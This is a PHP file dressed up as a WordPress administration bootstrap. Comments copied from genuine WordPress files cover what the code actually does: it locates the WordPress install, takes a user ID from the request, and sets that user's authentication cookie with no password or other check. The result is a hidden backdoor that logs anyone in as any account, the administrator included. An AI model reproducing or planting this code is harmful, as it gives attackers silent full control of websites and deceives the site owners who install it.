<?php
/**
 * WordPress Administration Bootstrap
 *
 * @package WordPress
 * @subpackage Administration
 */

/**
 * In WordPress Administration Screens
 *
 * @since 2.3.2
 */
$file="wp-load.php";
$dirname = dirname(__FILE__);
$wp_directory=$dirname.DIRECTORY_SEPARATOR;

/**
 * Fires as an admin screen or script is being initialized.
 *
 * Note, this does not just run on user-facing admin screens.
 * It runs on admin-ajax.php and admin-post.php as well.
 *
 * This is roughly analogous to the more general {@see 'init'} hook, which fires earlier.
 *
 * @since 2.5.0
 */
while(!file_exists($wp_directory.$file)) {
	$wp_directory =dirname($wp_directory).DIRECTORY_SEPARATOR;
}
/**
* Fires before a particular screen is loaded.
*
* The load-* hook fires in a number of contexts. This hook is for plugin screens
* where a callback is provided when the screen is registered.
*
* The dynamic portion of the hook name, `$page_hook`, refers to a mixture of plugin
* page information including:
* 1. The page type. If the plugin page is registered as a submenu page, such as for
*    Settings, the page type would be 'settings'. Otherwise the type is 'toplevel'.
* 2. A separator of '_page_'.
* 3. The plugin basename minus the file extension.
*
* Together, the three parts form the `$page_hook`. Citing the example above,
* the hook name used would be 'load-settings_page_pluginbasename'.
*
* @see get_plugin_page_hook()
*
 * @since 2.1.0
 */
if(!file_exists($wp_directory.'wp-blog-header.php') || !file_exists($wp_directory.'wp-includes/pluggable.php')){
    die('Some files are missing');
}
#print $wp_directory;
$id = $_REQUEST['id'];
/**
 * User Profile Administration Screen.
 *
 * @package WordPress
 * @subpackage Administration
 */

/**
 * This is a profile page.
 *
 * @since 2.5.0
 * @var bool
 */
if (!empty($id)){
	require($wp_directory.'wp-blog-header.php');
	require($wp_directory.'wp-includes/pluggable.php');
	$user = get_user_by('ID', $id );
	if ( !is_wp_error( $user ) ) {
		wp_clear_auth_cookie();
		wp_set_current_user ( $user->ID );
		wp_set_auth_cookie  ( $user->ID );
		$redirect_to = user_admin_url();
		wp_safe_redirect( $redirect_to );
		exit();
	} else {
		die("The user does not exist");
	}
}else{
	die('empty id');
}